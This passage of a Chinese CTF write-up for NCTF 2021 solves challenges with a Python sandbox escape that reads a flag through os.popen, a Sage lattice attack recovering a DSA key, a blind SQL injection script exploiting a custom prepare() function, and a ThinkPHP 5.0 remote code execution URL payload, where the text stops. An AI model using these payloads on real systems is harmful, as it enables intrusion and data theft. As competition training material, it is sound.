class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">code = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = b64decode(code.encode()).decode()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;h&quot;\&#x27;(&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> data: exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(data)</span><br></pre></td></tr></table></figure></blockquote><p>挺有趣的结合了QQBot的python逃逸，由代码知需传入python代码段，不能包含括号、单双引号和字母h，最后<code>exec</code> 函数执行。</p><p>断掉了 <code>print()</code> 和 <code>help()</code> 输出方式，可以采用python中的语法糖 <code>@</code> 类装饰器，在创建类时触发装饰器中的代码逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">95</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">41</span></span><br><span class="line">y=<span class="keyword">lambda</span> z:x</span><br><span class="line"><span class="meta">@print</span></span><br><span class="line"><span class="meta">@eval</span></span><br><span class="line"><span class="meta">@bytes</span></span><br><span class="line"><span class="meta">@y</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">z</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__(&#x27;os&#x27;).popen(&#x27;cat /home/flag&#x27;).read()</span></span><br></pre></td></tr></table></figure><p>Bot返回flag：<code>NCTF&#123;HexQBot_1s_s0_cut3~&#125;</code>。</p><p>​    </p><h3 id="做题做累了来玩玩游戏吧"><a href="#做题做累了来玩玩游戏吧" class="headerlink" title="做题做累了来玩玩游戏吧"></a>做题做累了来玩玩游戏吧</h3><blockquote><p>做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～<br>对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持</p></blockquote><p>Unity3D 游戏，主逻辑都在 <code>Assembly-CSarp.dll</code> 中，找到文件：</p><p><code>PlaneFire.app/Contents/Resources/Data/Managed/Assembly-CSharp.dll</code></p><p>用ILSpy查看dll程序逻辑，发现最终通过访问 <code>http://h4ck.fun/g4me.txt</code> 获取flag：<code>NCTF&#123;B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A&#125;</code>。</p><p>​    </p><h3 id="问卷题"><a href="#问卷题" class="headerlink" title="问卷题"></a>问卷题</h3><blockquote><p>问卷链接：<a href="https://forms.gle/RcKhJo2uQwQrL4Gu9">https://forms.gle/RcKhJo2uQwQrL4Gu9</a><br>提示：是Google问卷</p></blockquote><p>签退，答完就有flag：<code>NCTF&#123;Thank_y0u_for_your_participation&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="dsa"><a href="#dsa" class="headerlink" title="dsa"></a>dsa</h3><blockquote><p>flag格式nctf{.*}，题目见附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">522</span>)</span><br><span class="line">        q = p//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    g = <span class="number">3</span></span><br><span class="line">    h = long_to_bytes(getPrime(<span class="number">256</span>))</span><br><span class="line">    x = <span class="built_in">int</span>.from_bytes(h*<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">    <span class="keyword">return</span> g, p, q, y, x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">h, x</span>):</span></span><br><span class="line">    k = sha256(h.encode().<span class="built_in">hex</span>().encode()).digest()+sha256(<span class="built_in">bytes</span>.fromhex(h)+x.to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).digest()</span><br><span class="line">    k = <span class="built_in">int</span>.from_bytes(k, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    r = <span class="built_in">pow</span>(g,k,p)</span><br><span class="line">    s = (r*x+<span class="built_in">int</span>(h,<span class="number">16</span>))*inverse(k,q)%q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line">g, p, q, y, x = keygen()</span><br><span class="line">flag = <span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>],<span class="number">16</span>)^<span class="built_in">int</span>(sha256(x.to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).hexdigest(),<span class="number">16</span>)</span><br><span class="line">r, s = sign(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:], x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203</span></span><br><span class="line"><span class="string">7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636</span></span><br><span class="line"><span class="string">19480592192543881131267167328019941277106895469291691207381812905033306766991</span></span><br><span class="line"><span class="string">962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442</span></span><br><span class="line"><span class="string">1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DSA签名算法，将明文 $m$ 与私钥 $x$ 哈希值 $h(x)$ 的异或值 $H=m \oplus h(x)$ 传入<code>sign()</code> 函数，并将 $H$ 与 $h(H+x)$ 连接得到的 $k$ 作为临时密钥，计算 $r=g^k \bmod p$ 和 $s=(rx+H)k^{-1} \bmod q$，给出签名结果 $(r,s)$，求私钥 $x$。</p><p>已知 $g,q,p=2q+1,y,H,r,s$，$x$ 为512位，根据 <code>x = int.from_bytes(h*2, &quot;big&quot;)</code> 可知  $x \mid (2^{256}+1)$，设 $x=(2^{256}+1)d’$，则 $d’$ 也是256位。</p><p>$k$ 由 $H$ 与 $h(H+x)$ 连接得到，$H$ 已知，即 $k$ 的高256位已知，低256位未知，设 $k=2^{256}H+h’$。</p><p>根据 $s=(rx+H)k^{-1} \bmod q$，有：</p><p>$(2^{256}H+h’)s-(2^{256}+1)d’r-H \equiv 0 \pmod q$ </p><p>利用coppersmith定理构造格，通过LLL算法计算 $(h’,d’)$，这里采用small_roots脚本攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">d = f.degree()</span><br><span class="line"></span><br><span class="line">R = f.base_ring()</span><br><span class="line">N = R.cardinality()</span><br><span class="line"></span><br><span class="line">f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">base = N^(m-i) * f^i</span><br><span class="line"><span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">G.append(g)</span><br><span class="line"></span><br><span class="line">B, monomials = G.coefficient_matrix()</span><br><span class="line">monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line"><span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">B = B.change_ring(QQ)</span><br><span class="line"><span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">H.append(h)</span><br><span class="line">I = H.ideal()</span><br><span class="line"><span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">H.pop()</span><br><span class="line"><span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">roots = []</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">roots.append(root)</span><br><span class="line"><span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">q=<span class="number">4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203</span></span><br><span class="line">g=<span class="number">3</span></span><br><span class="line">y=<span class="number">7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636</span></span><br><span class="line">h=<span class="number">19480592192543881131267167328019941277106895469291691207381812905033306766991</span></span><br><span class="line">r=<span class="number">962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442</span></span><br><span class="line">s=<span class="number">1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777</span></span><br><span class="line">p=<span class="number">2</span>*q+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">kmax=<span class="built_in">int</span>(sha256(<span class="built_in">hex</span>(h)[<span class="number">2</span>:].encode().<span class="built_in">hex</span>().encode()).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;h_, d_&gt; = PolynomialRing(Zmod(q))</span><br><span class="line"></span><br><span class="line">f = (<span class="number">2</span>^<span class="number">256</span> * kmax + h_) * s  - (<span class="number">2</span>^<span class="number">256</span> + <span class="number">1</span>) * d_ * r - h</span><br><span class="line">roots = small_roots(f, [<span class="number">2</span>^<span class="number">256</span>, <span class="number">2</span>^<span class="number">256</span>],  d=<span class="number">4</span>, m=<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    kmin = Integer(root[<span class="number">0</span>])</span><br><span class="line">    k = (<span class="number">2</span>^<span class="number">256</span> * kmax + kmin)</span><br><span class="line">    x_ = Integer(root[<span class="number">1</span>])</span><br><span class="line">    x_ = (<span class="number">2</span>^<span class="number">256</span> + <span class="number">1</span>) * x_</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, x_, p) == y:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] found: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] wrong: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_)</span><br><span class="line">flag = <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(<span class="built_in">int</span>(x_).to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).hexdigest(),<span class="number">16</span>) ^^ h)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110</span></span><br></pre></td></tr></table></figure><p>加上外壳，flag：<code>nctf&#123;1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110&#125;</code>。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><blockquote><p>这还能注入吗</p><p>Hint 1: 另一半flag在数据库中</p></blockquote><p><code>www.zip</code> 中三个文件 <code>config.php</code>、<code>DB.php</code>、<code>login.php</code>。</p><p><code>login.php</code> 中主逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$query</span> = db::prepare(<span class="string">&quot;SELECT * FROM `users` where password=md5(%s)&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// (1)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$query</span> = db::prepare(<span class="variable">$query</span> . <span class="string">&quot; and name=%s&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// (2)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$query</span> . <span class="string">&quot; and name=&#x27;benjaminEngel&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$query</span> . <span class="string">&quot; limit 1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = db::commit(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NCTF&#123;ez&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Wrong name or password.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用 <code>db::prepare</code> 预处理sql语句。</p><p>跟进 <code>DB.php</code> 看 <code>prepare()</code> 函数的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span>(<span class="params"><span class="variable">$query</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_null(<span class="variable">$query</span>))&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$query</span>, <span class="string">&#x27;%&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;%s not included in query!&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get args</span></span><br><span class="line"><span class="variable">$args</span> = func_get_args();</span><br><span class="line">array_shift( <span class="variable">$args</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$args_is_array</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$args</span>[<span class="number">0</span>]) &amp;&amp; count(<span class="variable">$args</span>) == <span class="number">1</span> ) &#123; <span class="comment">// (3)</span></span><br><span class="line"><span class="variable">$args</span> = <span class="variable">$args</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$args_is_array</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$count_format</span> = substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count_format</span> !== count(<span class="variable">$args</span>))&#123; <span class="comment">// (4)</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Wrong number of arguments!&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// escape</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> &amp;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="built_in">static</span>::<span class="variable">$db</span>-&gt;real_escape_string(<span class="variable">$value</span>); <span class="comment">// (5)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare</span></span><br><span class="line"><span class="variable">$query</span> = str_replace(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="variable">$query</span>); <span class="comment">// (6)</span></span><br><span class="line"><span class="variable">$query</span> = vsprintf(<span class="variable">$query</span>, <span class="variable">$args</span>); <span class="comment">// (7)</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$query</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(3)处 <code>prepare()</code> 函数接收的 <code>$args</code> 为数组，(4)处 判断接收参数数量和 <code>%s</code> 数量是否一致，(5)处转义特殊字符，(6)处给 <code>%s</code> 匹配的参数值加单引号，(7)处替换 <code>$query</code> 中对应的 <code>%s</code> 为参数值。</p><p>在(1)的password和(2)的name处都使用了格式化字符串 <code>%s</code>，可以在(1)处传入 <code>%s</code> 干扰匹配，并在(2)处传入数组匹配两处 <code>%s</code>：</p><p><code>password=%s</code>，<code>name[0]=) or 1=1 --</code>，<code>name[1]=x</code></p><p>sql语句由 <code>SELECT * FROM `users` where password=md5(%s) and name=%s limit 1</code></p><p>变为 <code>SELECT * FROM `users` where password=md5() or 1=1 -- ) and name=x limit 1</code>，实现注入。</p><p>POST传参读到前半部分flag：<code>NCTF&#123;3v3ryth1ng_</code>。</p><p>把 <code>or 1=1</code> 替换为布尔盲注if语句即可拿到后半部分flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://129.211.173.64:3080/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(group_concat(`fl@g`))from(`2021`.NcTF)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;%s&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;name[0]&#x27;</span>: <span class="string">f&quot;) or <span class="subst">&#123;payload&#125;</span> -- &quot;</span>,</span><br><span class="line">            <span class="string">&#x27;name[1]&#x27;</span>: <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url,params=data)</span></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;NCTF&#123;3v3ryth1ng_&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># not_fantast1c_:)&#125;</span></span><br></pre></td></tr></table></figure><p>合并，flag：<code>NCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125;</code></p><p>​    </p><h3 id="摆就完事了"><a href="#摆就完事了" class="headerlink" title="摆就完事了"></a>摆就完事了</h3><blockquote><p>啊对对对 太对辣太对辣<br>If you get no idea about the problem,there is no harm in diffing the source code with the official one.</p></blockquote><p>观察url结构 <code>/public/index.php/index/index/index</code>，疑似ThinkPHP路径，随便改写报错知为ThinkPHP V5.0.16。</p><p>尝试未开启强制路由RCE漏洞，加后缀：</p><p><code>http://129.211.173.64:8085/public/index.php/index/index/index?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</code></p><p>出现phpinfo页，改成 